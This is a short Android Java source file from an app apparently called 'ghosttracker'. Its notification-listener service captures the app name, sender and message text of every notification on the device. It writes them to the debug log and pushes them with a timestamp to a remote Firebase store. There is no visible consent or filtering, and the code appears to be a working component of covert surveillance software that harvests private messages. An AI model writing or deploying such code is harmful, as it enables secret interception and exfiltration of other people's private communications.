package com.maleezha.ghosttracker.services;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.maleezha.ghosttracker.utils.FirebaseHelper;

import java.util.HashMap;
import java.util.Map;

public class NotificationService extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();

        Bundle extras = sbn.getNotification().extras;
        CharSequence title = extras.getCharSequence("android.title");
        CharSequence text = extras.getCharSequence("android.text");
        CharSequence subText = extras.getCharSequence("android.subText");

        String sender = title != null ? title.toString() : "Unknown sender";
        String message = text != null ? text.toString() : "";
        String extraInfo = subText != null ? subText.toString() : "";

        String currentDateTime = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                .format(new java.util.Date());

        Log.d("NotifListener", "App: " + packageName);
        Log.d("NotifListener", "Sender: " + sender);
        Log.d("NotifListener", "Message: " + message);
        Log.d("NotifListener", "Extra: " + extraInfo);
        Map<String, String> notificationData = new HashMap<>();
        notificationData.put("packageName", packageName);
        notificationData.put("sender", sender);
        notificationData.put("message", message);
        notificationData.put("extraInfo", extraInfo);
        notificationData.put("dateTime", currentDateTime);

        FirebaseHelper.pushNotification(notificationData);
    }
}